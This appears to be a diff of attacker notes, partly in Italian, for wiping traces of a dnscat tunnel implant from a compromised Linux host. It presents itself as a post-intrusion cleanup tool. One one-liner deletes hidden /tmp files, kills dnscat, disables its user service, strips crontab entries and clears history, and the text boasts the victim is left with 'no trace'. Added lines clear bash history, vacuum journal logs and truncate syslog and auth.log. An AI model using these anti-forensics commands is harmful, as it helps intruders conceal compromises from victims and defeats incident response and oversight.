@@ -1,5 +1,3 @@
-osboxes@osboxes:~$ ps aux | grep -i dnscat 
-osboxes     4770  0.0  0.1   9144  2352 pts/0    S+   03:32   0:00 grep --color=auto -i dnscat
 
 
 
@@ -159,3 +157,25 @@ bash
 
 rm -rf /tmp/.sysupdate /tmp/sysupdate* /tmp/.hidden*;pkill -f dnscat;systemctl --user disable dnscat.service 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;(crontab -l 2>/dev/null|grep -v dnscat)|crontab - 2>/dev/null;history -c;echo "CLEAN!"
 Esegui il one-liner → esci dalla sessione → vittima pulita al 100%. Nessuna traccia!
+
+
+
+
+
+
+
+
+
+# Pulisci bash history
+history -c && history -w
+
+# Pulisci journalctl recenti (user level)
+journalctl --user -u dnscat --vacuum-time=1s 2>/dev/null || true
+
+# /var/log se hai accesso
+sudo truncate -s 0 /var/log/syslog /var/log/auth.log 2>/dev/null || true
+
+
+
+
+
